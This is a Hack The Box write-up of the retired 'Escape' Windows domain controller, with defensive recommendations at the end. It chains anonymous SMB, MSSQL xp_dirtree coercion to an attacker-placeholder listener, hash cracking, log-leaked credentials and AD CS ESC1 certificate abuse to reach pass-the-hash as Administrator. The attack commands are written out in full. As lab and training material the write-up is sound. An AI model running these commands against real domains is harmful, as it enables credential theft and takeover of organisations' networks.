---
title: "Escape — AD CS ESC1 from Anonymous SMB and MSSQL Coercion"
description: "Anonymous SMB and MSSQL coercion recover credentials, then AD CS ESC1 certificate abuse yields the privileged account NT hash."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - mssql
  - smb
objective: "Escalate from anonymous SMB and MSSQL access to domain administrator by chaining NTLM coercion with AD CS ESC1 certificate abuse."
tools:
  - nmap
  - NetExec
  - Responder
  - Impacket
  - hashcat
  - BloodHound
  - Certipy
  - evil-winrm
skill: "Active Directory attack-path chaining from anonymous access through AD CS abuse"
outcome: "WinRM access as <DOMAIN_USER> and Administrator command execution via an ESC1-issued certificate and pass-the-hash"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Server Active Directory domain controller for `<DOMAIN>` (MSSQL exposed) |
| Starting position | Unauthenticated network access with anonymous SMB read |
| Objective | Escalate from anonymous SMB and MSSQL access to domain administrator by chaining NTLM coercion with AD CS ESC1 certificate abuse |
| Outcome | WinRM access as `<DOMAIN_USER>`; Administrator command execution via an ESC1-issued certificate and pass-the-hash |

## From anonymous SMB to ESC1 certificate abuse

Escape is a Medium-rated Hack The Box Windows Active Directory lab. Anonymous SMB access exposes a readable `Public` share whose PDF discloses temporary MSSQL credentials. MSSQL is then abused with `xp_dirtree` to coerce NetNTLMv2 authentication from the SQL service account, and the captured hash is cracked offline. A SQL-accessible backup error log leaks a domain-user credential, which grants WinRM access. Privilege escalation abuses an ESC1-vulnerable AD CS certificate template to request a certificate for `<PRIVILEGED_USER>` and recover the account NT hash through PKINIT. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Anonymous SMB share → PDF MSSQL credential → `xp_dirtree` NTLMv2 coercion and crack → SQL error-log credential disclosure → WinRM as `<DOMAIN_USER>` → AD CS ESC1 certificate → PKINIT → Administrator NT hash → pass-the-hash**

## Domain controller services, anonymous SMB, and the escalation goal

- **Target:** Windows Server acting as the Active Directory domain controller for `<DOMAIN>`.
- **Exposed services:** DNS (53), Kerberos (88), LDAP (389), SMB (445), MSSQL (1433), WinRM (5985).
- **Starting position:** unauthenticated network access; anonymous SMB read is permitted.
- **Objective:** move from anonymous access through coercion, credential disclosure, and AD CS abuse to domain administrator control.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: anonymous share to ESC1 certificate

### 1. Service Enumeration

Observation: the host exposes six services on one address. DNS, Kerberos, LDAP, and SMB together indicate an Active Directory domain controller; MSSQL is exposed directly and WinRM offers a remote management path.

Action: version and default-script scan.

```bash
nmap -sC -sV -oA <OUT_PREFIX> <TARGET_IP>
```

Truncated scan output:

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          <DOMAIN>
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server
5985/tcp open  winrm
```

Significance: the Kerberos/LDAP/SMB combination confirms a domain controller for `<DOMAIN>`, and an exposed MSSQL service widens the attack surface beyond the directory.

Result: six services are confirmed, including SMB, MSSQL, and WinRM.

### 2. Anonymous SMB Share and Credential Disclosure

Observation: anonymous SMB access yields a readable `Public` share containing a single PDF, and that PDF discloses temporary SQL credentials.

Action: enumerate shares, then review the accessible document.

```bash
nxc smb <TARGET_IP> -u '<ANON_USER>' -p '' --shares
```

Share listing:

```text
Public   READ
IPC$     READ
NETLOGON READ
SYSVOL   READ
```

The `Public` share contains:

```text
SQL Server Procedures.pdf
```

The PDF discloses temporary SQL credentials:

```text
<DB_USER> : <DB_PASSWORD>
```

Significance: anonymous SMB is a common Windows misconfiguration, and placing an operational document with credentials on an unauthenticated share exposes a live SQL credential; no exploitation is required.

Result: a temporary MSSQL credential is recovered from the anonymous share.

### 3. MSSQL NTLM Coercion

Observation: the PDF-supplied credential is used to connect to MSSQL as `<DB_USER>`. The `xp_dirtree` extended stored procedure then coerces the SQL service account into authenticating to an attacker-controlled SMB listener, leaking its NetNTLMv2 hash.

Action: capture authentication with Responder, trigger it through MSSQL, then crack the capture offline.

```bash
sudo responder -I <INTERFACE>
```

```bash
impacket-mssqlclient <DOMAIN>/<DB_USER>:'<DB_PASSWORD>'@<DC_HOST>
```

```sql
EXEC xp_dirtree '\\<ATTACKER_IP>\pwnd'
```

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST>
```

Recovered credential:

```text
<SQL_SVC_USER> : <SQL_SVC_PASSWORD>
```

Significance: `xp_dirtree` resolves a UNC path by having the SQL Server service account open an SMB connection, so the account authenticates outward and discloses its NetNTLMv2 response. This coercion primitive works whenever outbound SMB is permitted from the SQL host, and weak service-account passwords fall to offline cracking.

Result: the SQL service account's NetNTLMv2 hash is captured and cracked to a plaintext password.

### 4. Host Log Credential Discovery

Observation: I checked attack-path enumeration with the recovered service credential and found no direct route. A SQL-accessible backup error log at `C:\SQLServer\Logs\ERRORLOG.BAK` contains failed login attempts that expose a mis-typed password for `<DOMAIN_USER>`.

Action: collect attack-path data with the service credential, then review SQL-accessible host logs.

```bash
bloodhound-ce-python -d <DOMAIN> -u '<SQL_SVC_USER>' -p '<SQL_SVC_PASSWORD>' -c all -gc <TARGET_IP>
```

The backup error log records a failed login attempt with a near-correct password:

```text
<DOMAIN>\<DOMAIN_USER>
<DOMAIN_USER_PASSWORD>
```

The inferred credential is validated against SMB:

```bash
nxc smb <DOMAIN> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PASSWORD>'
```

```text
[+] <DOMAIN>\<DOMAIN_USER>:<DOMAIN_USER_PASSWORD>
```

Significance: SQL Server error logs record authentication events, so a failed login with a slightly wrong password reveals both the account name and the intended secret. Interactive SQL usage by administrators commonly leaves these entries behind.

Result: a pair of `<DOMAIN_USER>` credentials is recovered and validated through SMB.

### 5. WinRM Access as <DOMAIN_USER>

Observation: the validated credential grants an interactive PowerShell session over WinRM as `<DOMAIN_USER>`.

Action: open a remote session.

```bash
evil-winrm -i <TARGET_IP> -u '<DOMAIN_USER>' -p '<DOMAIN_USER_PASSWORD>'
```

Session established:

```text
*Evil-WinRM* PS C:\Users\<DOMAIN_USER>\Desktop>
```

Significance: WinRM exposes native PowerShell remoting, giving a stable interactive context as the authenticated user rather than a dropped shell.

Result: an authenticated user-level session is obtained.

### 6. AD CS ESC1 and Privileged Access

Observation: `<DOMAIN_USER>` belongs to `Certificate Service DCOM Access`, and the domain hosts an Enterprise CA (`<CA_NAME>`). Certipy identifies the `UserAuthentication` template as ESC1-vulnerable: Domain Users can enroll, the enrollee supplies the subject, and the template enables client authentication.

Action: find vulnerable templates, request a certificate for `<PRIVILEGED_USER>`, authenticate with PKINIT to recover the NT hash, then pass the hash.

```bash
certipy find \
  -u '<DOMAIN_USER>' \
  -p '<DOMAIN_USER_PASSWORD>' \
  -dc-ip <TARGET_IP> \
  -target-ip <TARGET_IP> \
  -vulnerable -stdout -enable
```

Vulnerability finding:

```text
ESC1: Domain Users can enroll,
enrollee supplies subject,
template allows client authentication
```

Request a certificate impersonating `<PRIVILEGED_USER>`:

```bash
certipy req \
  -dc-ip <TARGET_IP> \
  -u '<DOMAIN_USER>' \
  -p '<DOMAIN_USER_PASSWORD>' \
  -ca '<CA_NAME>' \
  -template 'UserAuthentication' \
  -upn <PRIVILEGED_USER>@<DOMAIN>
```

Authenticate with the issued PFX and recover the NT hash:

```bash
certipy auth -pfx <PRIVILEGED_USER>.pfx -dc-ip <TARGET_IP>
```

```text
Got hash for '<PRIVILEGED_USER>@<DOMAIN>':
<ADMIN_LM_HASH>:<ADMIN_NT_HASH>
```

Pass the hash:

```bash
evil-winrm -i <TARGET_IP> -u <PRIVILEGED_USER> -H <ADMIN_NT_HASH>
```

```text
*Evil-WinRM* PS C:\Users\<PRIVILEGED_USER>\Desktop>
```

Significance: ESC1 combines three template conditions: low-privileged enrollment, enrollee-controlled subject, and client authentication, so a domain user can obtain a certificate naming a privileged account and authenticate with it through PKINIT. The recovered NT hash then supports pass-the-hash. This is a configuration abuse of legitimate AD CS functionality, not a software vulnerability.

Result: an Administrator WinRM session is obtained via an ESC1-issued certificate and pass-the-hash.

## Challenges: enumeration dead end and a log-file pivot

| Challenge | Decision |
|---|---|
| Attack-path enumeration with the service account surfaced no direct route | Reviewed SQL-accessible host files and the backup error log instead, which held the `<DOMAIN_USER>` credential |

## Outcome: Administrator WinRM via certificate and pass-the-hash

An Administrator WinRM session is obtained through an ESC1-issued certificate and pass-the-hash. The source records the NetNTLMv2 capture and the attack-path collection without terminal excerpts, so those transitions are reported as narrative steps.

## Recommendations: anonymous shares, SQL logs, coercion, and ESC1

The attack path demonstrates the exposures below; it does not include validation of the recommended controls.

1. **Anonymous SMB share exposing a credential-bearing document.** Anonymous read access let an unauthenticated party retrieve operational credentials. *Recommendation:* require authentication on file shares and keep credential-bearing documents off reachable shares. *Detection:* detect anonymous SMB sessions and on transfers of operational or backup documents.
2. **Credentials recorded in SQL Server error logs.** Failed-login entries disclosed a domain user's near-correct password. *Recommendation:* restrict access to SQL log directories, rotate credentials that appear in logs, and scrub authentication data from retained logs. *Detection:* monitor for failed logons that precede a successful authentication from the same source.
3. **MSSQL NTLM coercion via `xp_dirtree`.** The SQL service account authenticated outward and its NetNTLMv2 response was captured and cracked. *Recommendation:* remove or restrict extended stored procedures that resolve remote paths, block outbound SMB from database servers, and use long, high-entropy service-account passwords. *Detection:* monitor `xp_dirtree`/`xp_fileexist` calls resolving UNC paths and on outbound SMB from database servers.
4. **AD CS ESC1 template misconfiguration.** A template with low-privileged enrollment, enrollee-supplied subject, and client authentication enabled allowed domain-wide impersonation. *Recommendation:* audit certificate templates for ESC1 conditions; require manager approval or restrict enrollment, and disable enrollee-supplied subject where not needed. *Detection:* monitor certificate requests for privileged UPNs and for enrollment from ordinary domain accounts.

## References

- [Hack The Box — Escape](https://app.hackthebox.com/machines/Escape) (retired machine)
- [Certificate Template Concepts (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts) (AD CS template enrollment, subject name, and client authentication conditions)
- [Manage Certificate Templates (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage-certificate-templates) (template enrollment permissions and subject configuration)
- [Database Engine Extended Stored Procedures Programming (Microsoft Learn)](https://learn.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming) (extended stored procedures such as `xp_dirtree`)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server; NetNTLMv2 capture)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and share enumeration)
- [Impacket](https://github.com/fortra/impacket) (MSSQL client)
- [hashcat](https://hashcat.net/hashcat/) (offline password cracking, NetNTLMv2 mode 5600)
- [BloodHound](https://github.com/SpecterOps/BloodHound) (Active Directory attack-path enumeration)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM shell and pass-the-hash)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
